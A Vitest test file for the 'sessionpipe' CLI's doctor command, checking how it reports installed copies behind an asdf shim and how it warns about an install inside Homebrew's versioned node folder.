// From here on each test reloads the module graph, so the mocks and spies above are not its.
describe.skipIf(process.platform === "win32")("doctor started from an installed copy", () => {
  it("M3: a version manager's shim first on PATH, and doctor started through it from the one installed copy: that copy is what typing starts, and there is nothing to say", async () => {
    steadyHook();
    for (const k of [
      "npm_config_cache",
      "npm_config_prefix",
      "npm_command",
      "N_PREFIX",
      "NVM_DIR",
      "FNM_DIR",
      "ASDF_DATA_DIR",
      "VOLTA_HOME",
    ])
      vi.stubEnv(k, undefined as never);
    // As asdf lays it out: only its shims are on PATH, and the copy is in its own Node.
    const prefix = path.join(home, ".asdf", "installs", "nodejs", "22.1.0");
    const copy = path.join(prefix, "lib", "node_modules", "sessionpipe");
    put(path.join(copy, "package.json"), { name: "sessionpipe", version: "1.0.0" });
    put(path.join(copy, "dist", "cli.js"), "");
    mkdirSync(path.join(prefix, "bin"), { recursive: true });
    symlinkSync(
      path.join("..", "lib", "node_modules", "sessionpipe", "dist", "cli.js"),
      path.join(prefix, "bin", "sessionpipe"),
    );
    const shim = path.join(home, ".asdf", "shims", "sessionpipe");
    put(shim, '#!/bin/sh\nexec asdf exec sessionpipe "$@"\n');
    chmodSync(shim, 0o755);
    vi.stubEnv("PATH", path.dirname(shim));
    const about = (j: { warnings: string[] }): string[] =>
      j.warnings.filter((w) => /cop(y|ies) of sessionpipe|Typing `sessionpipe`|on your PATH/.test(w));
    // From a checkout, as every test above runs: it can't be told what the shim starts,
    // so nobody is known to type the copy, and doctor has nothing to say of it.
    const outside = JSON.parse((await run("doctor", "--json")).lines.join("\n"));
    expect(outside.copies).toEqual([{ dir: copy, version: "1.0.0", whole: true, uses: [] }]);
    expect(about(outside)).toEqual([]);
    vi.resetModules();
    dist.dir = path.join(copy, "dist");
    const started = process.argv[1] as string;
    try {
      const installed: Cli = await import("../src/cli.js");
      const at = async (...argv: string[]): Promise<string[]> => {
        const lines: string[] = [];
        await installed.main(argv, { out: (s = "") => void lines.push(s), err: vi.fn(), exit: vi.fn() });
        return lines;
      };
      // From that copy, started as its cli.js by its path (`node …/dist/cli.js doctor`):
      // the shim did not start it, so what the shim starts is still not known.
      process.argv[1] = path.join(copy, "dist", "cli.js");
      const byPath = JSON.parse((await at("doctor", "--json")).join("\n"));
      expect(byPath.copies).toEqual([{ dir: copy, version: "1.0.0", whole: true, uses: ["this"] }]);
      expect(about(byPath)).toEqual([]);
      // Started as npm's own link to that copy, which is what a shim runs: the shim is
      // what started this command, and this copy is what typing starts.
      process.argv[1] = path.join(prefix, "bin", "sessionpipe");
      const j = JSON.parse((await at("doctor", "--json")).join("\n"));
      expect(j.copies).toEqual([{ dir: copy, version: "1.0.0", whole: true, uses: ["typed", "this"] }]);
      expect(about(j)).toEqual([]);
      for (const page of [await at("doctor"), await at("status")]) {
        expect(page[0]).toBe("✓ All good");
        expect(page.join("\n")).not.toContain("copies");
        expect(page.join("\n")).not.toContain("sessionpipe reinstall");
      }
    } finally {
      process.argv[1] = started;
      dist.dir = realDist;
    }
  });
});

// Last of them: a copy that is where no copy should be.
describe.skipIf(process.platform === "win32")("a copy under Homebrew's versioned node", () => {
  it("is warned about by doctor, with a hook path it can't resolve", async () => {
    vi.resetModules();
    dist.dir = "/opt/homebrew/Cellar/node/25.1.0/lib/node_modules/sessionpipe/dist";
    try {
      const brewed: Cli = await import("../src/cli.js");
      put(path.join(home, ".claude", "settings.json"), {});
      onPlatform("win32");
      const lines: string[] = [];
      await brewed.main(["doctor", "--json"], { out: (s = "") => void lines.push(s), err: vi.fn(), exit: vi.fn() });
      const j = JSON.parse(lines.join("\n"));
      expect(j.warnings).toContain(
        "sessionpipe is installed inside Homebrew's versioned node folder; `brew upgrade node` will delete it. Install with `npm install -g --prefix ~/.local sessionpipe`.",
      );
      expect(j.harnesses["claude-code"][0].state).toBe("missing");
      // For a person: a row for where it is installed, and the one command that moves it.
      const page: string[] = [];
      await brewed.main(["doctor"], { out: (s = "") => void page.push(s), err: vi.fn(), exit: vi.fn() });
      expect(page.join("\n")).toMatch(
        row("!", "installed in", "Homebrew's node folder, which `brew upgrade node` deletes"),
      );
      const at = page.findIndex((l) =>
        l.endsWith(
          ". sessionpipe is installed inside Homebrew's node folder, and `brew upgrade node` will delete it. Install it where it stays:",
        ),
      );
      expect(at).toBeGreaterThan(page.indexOf("To fix"));
      expect(page[at + 1]).toBe("       npm install -g --prefix ~/.local sessionpipe");
      expect(process.exitCode).toBe(1);
    } finally {
      dist.dir = realDist;
    }
  });
});
